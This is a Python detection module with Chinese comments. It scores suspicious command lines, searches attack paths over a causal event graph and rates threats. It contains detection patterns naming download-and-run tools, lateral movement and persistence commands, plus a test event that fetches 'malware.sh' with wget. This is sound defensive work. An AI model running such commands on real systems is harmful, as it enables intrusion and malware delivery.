# -*- coding: utf-8 -*-
"""
攻击检测模块 - 检测攻击入口点和攻击路径

主要功能:
1. 外部入口点检测
2. 攻击路径搜索
3. 威胁评分

作者: YourName
日期: 2024
"""

import re
from datetime import datetime, timedelta
from typing import List, Dict, Any, Set, Tuple
from collections import defaultdict

from sz_config import system_config

class ExternalEntryDetector:
    """外部入口点检测器 - 检测攻击的入口点"""
    
    def __init__(self):
        # 可疑模式定义
        self.suspicious_patterns = {
            "remote_access": [
                r"ssh\s+.*@",
                r"rdp\s+.*:",
                r"telnet\s+",
                r"ftp\s+.*@"
            ],
            "web_exploit": [
                r"wget\s+http",
                r"curl\s+.*http",
                r"powershell.*downloadstring",
                r"certutil.*urlcache"
            ],
            "lateral_movement": [
                r"psexec\s+",
                r"wmic\s+.*process",
                r"net\s+use\s+",
                r"copy\s+.*\$"
            ],
            "persistence": [
                r"schtasks\s+.*create",
                r"reg\s+add.*run",
                r"sc\s+create",
                r"at\s+\d+:"
            ]
        }
        
        # 高风险端口
        self.high_risk_ports = {22, 23, 135, 139, 445, 1433, 3389, 5985, 5986}
        
        # 工作时间定义 (9:00-18:00)
        self.work_hours = (9, 18)
    
    def detect_entry_points(self, events: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """检测攻击入口点"""
        entry_points = []
        
        for event in events:
            if not event.get("is_external_event", False):
                continue
                
            entry_info = self._analyze_entry_point(event)
            if entry_info["confidence"] > 0.3:  # 置信度阈值
                entry_points.append(entry_info)
        
        # 按置信度排序
        entry_points.sort(key=lambda x: x["confidence"], reverse=True)
        return entry_points
    
    def _analyze_entry_point(self, event: Dict[str, Any]) -> Dict[str, Any]:
        """分析单个事件作为入口点的可能性"""
        confidence = 0.0
        indicators = []
        severity = "LOW"
        
        # 1. 检查可疑模式
        suspicious_score = self._check_suspicious_patterns(event)
        confidence += suspicious_score * 0.4
        if suspicious_score > 0.5:
            indicators.append("suspicious_command_pattern")
        
        # 2. 检查外部IP
        external_score = self._check_external_indicators(event)
        confidence += external_score * 0.3
        if external_score > 0.5:
            indicators.append("external_communication")
        
        # 3. 检查时间模式
        time_score = self._check_time_patterns(event)
        confidence += time_score * 0.2
        if time_score > 0.5:
            indicators.append("off_hours_activity")
        
        # 4. 检查攻击技术
        technique_score = self._check_attack_techniques(event)
        confidence += technique_score * 0.1
        if technique_score > 0.5:
            indicators.append("known_attack_technique")
        
        # 确定严重程度
        if confidence > 0.8:
            severity = "HIGH"
        elif confidence > 0.5:
            severity = "MEDIUM"
        
        return {
            "event_id": event["event_id"],
            "timestamp": event["timestamp"],
            "source_device": event["source_device"],
            "confidence": min(1.0, confidence),
            "severity": severity,
            "indicators": indicators,
            "details": self._get_entry_details(event),
            "attack_techniques": self._identify_attack_techniques(event)
        }
    
    def _check_suspicious_patterns(self, event: Dict[str, Any]) -> float:
        """检查可疑模式"""
        score = 0.0
        command_line = event.get("causal_attributes", {}).get("command_line", "")
        
        if not command_line:
            return 0.0
        
        cmd_lower = command_line.lower()
        
        for category, patterns in self.suspicious_patterns.items():
            for pattern in patterns:
                if re.search(pattern, cmd_lower):
                    if category == "remote_access":
                        score += 0.8
                    elif category == "web_exploit":
                        score += 0.7
                    elif category == "lateral_movement":
                        score += 0.6
                    elif category == "persistence":
                        score += 0.5
                    break
        
        return min(1.0, score)
    
    def _check_external_indicators(self, event: Dict[str, Any]) -> float:
        """检查外部指标"""
        score = 0.0
        
        # 检查外部IP
        external_ips = event.get("extracted_ips", {}).get("external_ips", [])
        if external_ips:
            score += 0.6
        
        # 检查网络连接类型
        if event.get("event_type") == "NETWORK_CONNECTION":
            score += 0.3
        
        # 检查端口
        port = event.get("causal_attributes", {}).get("destination_port")
        if port and int(port) in self.high_risk_ports:
            score += 0.4
        
        return min(1.0, score)
    
    def _check_time_patterns(self, event: Dict[str, Any]) -> float:
        """检查时间模式"""
        timestamp = event.get("timestamp")
        if not timestamp:
            return 0.0
        
        # 检查是否在工作时间外
        hour = timestamp.hour
        if hour < self.work_hours[0] or hour > self.work_hours[1]:
            return 0.7
        
        # 检查是否在周末
        if timestamp.weekday() >= 5:  # 周六、周日
            return 0.5
        
        return 0.0
    
    def _check_attack_techniques(self, event: Dict[str, Any]) -> float:
        """检查攻击技术"""
        techniques = self._identify_attack_techniques(event)
        return min(1.0, len(techniques) * 0.3)
    
    def _get_entry_details(self, event: Dict[str, Any]) -> Dict[str, Any]:
        """获取入口点详细信息"""
        return {
            "event_type": event.get("event_type"),
            "command_line": event.get("causal_attributes", {}).get("command_line", ""),
            "external_ips": event.get("extracted_ips", {}).get("external_ips", []),
            "process_name": event.get("causal_attributes", {}).get("process_name", ""),
            "user": event.get("causal_attributes", {}).get("user", "")
        }
    
    def _identify_attack_techniques(self, event: Dict[str, Any]) -> List[str]:
        """识别攻击技术"""
        techniques = []
        command_line = event.get("causal_attributes", {}).get("command_line", "")
        
        if command_line:
            cmd_lower = command_line.lower()
            
            # MITRE ATT&CK 技术映射
            if "ssh" in cmd_lower:
                techniques.append("T1021.004 - Remote Services: SSH")
            elif "rdp" in cmd_lower or "3389" in cmd_lower:
                techniques.append("T1021.001 - Remote Services: Remote Desktop Protocol")
            elif "psexec" in cmd_lower:
                techniques.append("T1021.002 - Remote Services: SMB/Windows Admin Shares")
            elif "powershell" in cmd_lower:
                techniques.append("T1059.001 - Command and Scripting Interpreter: PowerShell")
            elif "wget" in cmd_lower or "curl" in cmd_lower:
                techniques.append("T1105 - Ingress Tool Transfer")
        
        return techniques
    
    def print_entry_detection_results(self, entry_points: List[Dict[str, Any]]):
        """打印入口点检测结果"""
        print(f"\n=== 检测到 {len(entry_points)} 个潜在入口点 ===")
        
        for i, entry in enumerate(entry_points, 1):
            print(f"\n{i}. 入口点 {entry['event_id']}")
            print(f"   时间: {entry['timestamp']}")
            print(f"   设备: {entry['source_device']}")
            print(f"   置信度: {entry['confidence']:.2f}")
            print(f"   严重程度: {entry['severity']}")
            print(f"   指标: {', '.join(entry['indicators'])}")
            
            if entry['attack_techniques']:
                print(f"   攻击技术: {', '.join(entry['attack_techniques'])}")
            
            details = entry['details']
            if details['command_line']:
                print(f"   命令行: {details['command_line'][:100]}...")
            if details['external_ips']:
                print(f"   外部IP: {', '.join(details['external_ips'])}")

class AttackPathSearcher:
    """攻击路径搜索器 - 搜索和分析攻击路径"""
    
    def __init__(self, causal_graph):
        self.causal_graph = causal_graph
        self.max_path_length = system_config.MAX_ATTACK_PATH_LENGTH
        self.min_confidence = system_config.MIN_PATH_CONFIDENCE
    
    def search_attack_paths(self, entry_points: List[Dict[str, Any]], 
                          events: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """搜索攻击路径"""
        attack_paths = []
        
        # 为每个入口点搜索攻击路径
        for entry_point in entry_points:
            entry_event_id = entry_point["event_id"]
            
            # 使用DFS搜索从入口点开始的路径
            paths = self._dfs_attack_paths(entry_event_id, events)
            
            for path in paths:
                path_info = self._analyze_attack_path(path, entry_point, events)
                if path_info["score"] > self.min_confidence:
                    attack_paths.append(path_info)
        
        # 过滤和排序路径
        return self.filter_and_rank_paths(attack_paths)
    
    def _dfs_attack_paths(self, start_event_id: str, events: List[Dict[str, Any]], 
                         visited: Set[str] = None, current_path: List[str] = None) -> List[List[str]]:
        """使用DFS搜索攻击路径"""
        if visited is None:
            visited = set()
        if current_path is None:
            current_path = []
        
        # 防止路径过长
        if len(current_path) >= self.max_path_length:
            return [current_path[:]]
        
        visited.add(start_event_id)
        current_path.append(start_event_id)
        
        paths = []
        
        # 查找后续事件
        successors = self.causal_graph.get_successors(start_event_id)
        
        if not successors:
            # 叶子节点，返回当前路径
            paths.append(current_path[:])
        else:
            for successor in successors:
                if successor not in visited:
                    sub_paths = self._dfs_attack_paths(successor, events, visited.copy(), current_path[:])
                    paths.extend(sub_paths)
        
        return paths
    
    def _analyze_attack_path(self, path: List[str], entry_point: Dict[str, Any], 
                           events: List[Dict[str, Any]]) -> Dict[str, Any]:
        """分析攻击路径"""
        # 获取路径中的事件
        event_dict = {event["event_id"]: event for event in events}
        path_events = [event_dict[event_id] for event_id in path if event_id in event_dict]
        
        if not path_events:
            return {"score": 0.0}
        
        # 分析路径特征
        devices = set(event["source_device"] for event in path_events)
        attack_stages = self._identify_attack_stages(path_events)
        techniques = self._identify_attack_techniques_for_path(path_events)
        
        # 构建时间线
        timeline = sorted(path_events, key=lambda x: x["timestamp"])
        
        # 计算路径得分
        score = self._calculate_path_score({
            "events": path_events,
            "devices": devices,
            "attack_stages": attack_stages,
            "techniques": techniques,
            "entry_point": entry_point,
            "cross_device": len(devices) > 1
        })
        
        return {
            "path_id": f"path_{hash(tuple(path))}",
            "events": path,
            "timeline": [{
                "event_id": event["event_id"],
                "timestamp": event["timestamp"],
                "device": event["source_device"],
                "description": self._get_event_description(event)
            } for event in timeline],
            "devices": list(devices),
            "attack_stages": list(attack_stages),
            "techniques": list(techniques),
            "entry_point": entry_point,
            "cross_device": len(devices) > 1,
            "score": score,
            "severity": "HIGH" if score > 0.7 else "MEDIUM" if score > 0.4 else "LOW"
        }
    
    def _get_event_description(self, event: Dict[str, Any]) -> str:
        """获取事件描述"""
        event_type = event.get("event_type", "UNKNOWN")
        command = event.get("causal_attributes", {}).get("command_line", "")
        process = event.get("causal_attributes", {}).get("process_name", "")
        
        if command:
            return f"{event_type}: {command[:50]}..."
        elif process:
            return f"{event_type}: {process}"
        else:
            return event_type
    
    def _identify_attack_stages(self, events: List[Dict[str, Any]]) -> Set[str]:
        """识别攻击阶段"""
        stages = set()
        
        for event in events:
            command_line = event.get("causal_attributes", {}).get("command_line", "")
            event_type = event.get("event_type", "")
            
            if command_line:
                cmd_lower = command_line.lower()
                
                # 初始访问
                if any(pattern in cmd_lower for pattern in ["ssh", "rdp", "telnet", "ftp"]):
                    stages.add("Initial Access")
                
                # 执行
                if any(pattern in cmd_lower for pattern in ["powershell", "cmd", "bash", "sh"]):
                    stages.add("Execution")
                
                # 持久化
                if any(pattern in cmd_lower for pattern in ["schtasks", "crontab", "service", "reg add"]):
                    stages.add("Persistence")
                
                # 权限提升
                if any(pattern in cmd_lower for pattern in ["sudo", "runas", "uac"]):
                    stages.add("Privilege Escalation")
                
                # 防御规避
                if any(pattern in cmd_lower for pattern in ["disable", "stop", "kill"]):
                    stages.add("Defense Evasion")
                
                # 凭据访问
                if any(pattern in cmd_lower for pattern in ["password", "hash", "credential"]):
                    stages.add("Credential Access")
                
                # 发现
                if any(pattern in cmd_lower for pattern in ["whoami", "net user", "ps", "netstat"]):
                    stages.add("Discovery")
                
                # 横向移动
                if any(pattern in cmd_lower for pattern in ["psexec", "wmic", "net use"]):
                    stages.add("Lateral Movement")
                
                # 收集
                if any(pattern in cmd_lower for pattern in ["copy", "xcopy", "robocopy", "tar"]):
                    stages.add("Collection")
                
                # 渗出
                if any(pattern in cmd_lower for pattern in ["ftp", "scp", "wget", "curl"]):
                    stages.add("Exfiltration")
            
            # 基于事件类型
            if event.get("is_external_event"):
                stages.add("Initial Access")
            
            if event_type == "NETWORK_CONNECTION":
                stages.add("Command and Control")
        
        return stages
    
    def _identify_attack_techniques_for_path(self, events: List[Dict[str, Any]]) -> Set[str]:
        """为路径识别攻击技术"""
        techniques = set()
        
        for event in events:
            command_line = event.get("causal_attributes", {}).get("command_line", "")
            
            if command_line:
                cmd_lower = command_line.lower()
                
                # 常见攻击技术
                if "powershell" in cmd_lower:
                    techniques.add("T1059.001 - PowerShell")
                elif "nc" in cmd_lower or "netcat" in cmd_lower:
                    techniques.add("T1095 - Non-Application Layer Protocol")
            
            # 基于事件类型识别技术
            if event["event_type"] == "NETWORK_CONNECTION" and event["is_external_event"]:
                techniques.add("T1071 - Application Layer Protocol")
            elif event["event_type"] == "PROCESS_LAUNCH":
                techniques.add("T1059 - Command and Scripting Interpreter")
        
        return list(techniques)
    
    def _calculate_path_score(self, path_info: Dict[str, Any]) -> float:
        """计算路径得分"""
        score = 0.0
        
        # 1. 路径长度得分 (30%)
        length_score = min(1.0, len(path_info["events"]) / 10)
        score += length_score * 0.3
        
        # 2. 跨设备传播得分 (25%)
        if path_info["cross_device"]:
            device_score = min(1.0, len(path_info["devices"]) / 5)
            score += device_score * 0.25
        
        # 3. 攻击阶段完整性得分 (20%)
        stage_score = min(1.0, len(path_info["attack_stages"]) / 5)
        score += stage_score * 0.2
        
        # 4. 入口点置信度得分 (15%)
        entry_confidence = path_info["entry_point"]["confidence"]
        score += entry_confidence * 0.15
        
        # 5. 攻击技术多样性得分 (10%)
        technique_score = min(1.0, len(path_info["techniques"]) / 3)
        score += technique_score * 0.1
        
        return min(1.0, score)
    
    def get_attack_summary(self, attack_paths: List[Dict[str, Any]]) -> Dict[str, Any]:
        """获取攻击总结"""
        if not attack_paths:
            return {"total_paths": 0, "devices_affected": 0, "severity": "NONE"}
        
        all_devices = set()
        all_techniques = set()
        all_stages = set()
        max_score = 0.0
        
        for path in attack_paths:
            all_devices.update(path["devices"])
            all_techniques.update(path["techniques"])
            all_stages.update(path["attack_stages"])
            max_score = max(max_score, path["score"])
        
        # 确定整体严重程度
        if max_score > 0.8 or len(all_devices) > 3:
            overall_severity = "HIGH"
        elif max_score > 0.5 or len(all_devices) > 1:
            overall_severity = "MEDIUM"
        else:
            overall_severity = "LOW"
        
        return {
            "total_paths": len(attack_paths),
            "devices_affected": len(all_devices),
            "techniques_used": len(all_techniques),
            "attack_stages": len(all_stages),
            "max_score": max_score,
            "severity": overall_severity,
            "device_list": list(all_devices),
            "technique_list": list(all_techniques),
            "stage_list": list(all_stages)
        }
    
    def filter_and_rank_paths(self, attack_paths: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """过滤和排序攻击路径"""
        if not attack_paths:
            return []
        
        # 过滤低质量路径
        filtered_paths = [path for path in attack_paths if path["score"] > 0.3]
        
        # 按得分排序
        filtered_paths.sort(key=lambda x: x["score"], reverse=True)
        
        # 限制返回数量
        return filtered_paths[:20]

class ThreatScorer:
    """威胁评分器 - 计算威胁得分"""
    
    def __init__(self):
        self.base_scores = system_config.ATTACK_PATTERN_SCORES
    
    def calculate_threat_score(self, entry_points: List[Dict[str, Any]], 
                             attack_paths: List[Dict[str, Any]], 
                             events: List[Dict[str, Any]] = None) -> Dict[str, Any]:
        """计算威胁得分"""
        if not attack_paths and not entry_points:
            return {"total_score": 0.0, "risk_level": "NONE", "components": {}}
        
        components = {
            "entry_point_score": 0.0,
            "path_complexity_score": 0.0,
            "cross_device_score": 0.0,
            "technique_diversity_score": 0.0,
            "temporal_score": 0.0
        }
        
        # 1. 入口点得分
        if entry_points:
            avg_entry_confidence = sum(ep["confidence"] for ep in entry_points) / len(entry_points)
            components["entry_point_score"] = avg_entry_confidence * 100
        
        # 2. 路径复杂度得分
        if attack_paths:
            avg_path_score = sum(path["score"] for path in attack_paths) / len(attack_paths)
            components["path_complexity_score"] = avg_path_score * 100
        
        # 3. 跨设备传播得分
        all_devices = set()
        for path in attack_paths:
            all_devices.update(path["devices"])
        
        if len(all_devices) > 1:
            components["cross_device_score"] = min(100, len(all_devices) * 20)
        
        # 4. 技术多样性得分
        all_techniques = set()
        for path in attack_paths:
            all_techniques.update(path["techniques"])
        
        components["technique_diversity_score"] = min(100, len(all_techniques) * 15)
        
        # 5. 时间模式得分
        if attack_paths:
            # 检查攻击持续时间
            all_timestamps = []
            for path in attack_paths:
                for event in path["timeline"]:
                    all_timestamps.append(event["timestamp"])
            
            if all_timestamps:
                duration = (max(all_timestamps) - min(all_timestamps)).total_seconds()
                # 持续时间越长，得分越高（表示更复杂的攻击）
                components["temporal_score"] = min(100, duration / 3600 * 10)  # 每小时10分
        
        # 计算总得分（加权平均）
        weights = {
            "entry_point_score": 0.3,
            "path_complexity_score": 0.25,
            "cross_device_score": 0.2,
            "technique_diversity_score": 0.15,
            "temporal_score": 0.1
        }
        
        total_score = sum(components[key] * weights[key] for key in components)
        
        # 确定风险等级
        if total_score >= 80:
            risk_level = "CRITICAL"
        elif total_score >= 60:
            risk_level = "HIGH"
        elif total_score >= 40:
            risk_level = "MEDIUM"
        elif total_score >= 20:
            risk_level = "LOW"
        else:
            risk_level = "MINIMAL"
        
        return {
            "total_score": round(total_score, 2),
            "risk_level": risk_level,
            "components": {k: round(v, 2) for k, v in components.items()}
        }

# 测试函数
def test_attack_detection():
    """测试攻击检测功能"""
    print("=== 攻击检测功能测试 ===")
    
    # 创建测试事件
    from datetime import datetime
    test_events = [
        {
            "event_id": "evt_000001",
            "timestamp": datetime.now(),
            "source_device": "192.168.1.101",
            "event_type": "NETWORK_RECEIVE",
            "extracted_ips": {"external_ips": ["192.168.1.200"], "internal_ips": []},
            "is_external_event": True,
            "causal_attributes": {"command_line": "ssh user@192.168.1.200"}
        },
        {
            "event_id": "evt_000002",
            "timestamp": datetime.now() + timedelta(seconds=5),
            "source_device": "192.168.1.101",
            "event_type": "PROCESS_LAUNCH",
            "extracted_ips": {"external_ips": [], "internal_ips": []},
            "is_external_event": False,
            "causal_attributes": {"command_line": "wget http://192.168.1.200/malware.sh"}
        }
    ]
    
    # 测试入口点检测
    detector = ExternalEntryDetector()
    entry_points = detector.detect_entry_points(test_events)
    
    print(f"\n检测到 {len(entry_points)} 个入口点")
    for ep in entry_points:
        print(f"  - {ep['event_id']}: 置信度 {ep['confidence']:.2f}, 严重程度 {ep['severity']}")

if __name__ == "__main__":
    test_attack_detection()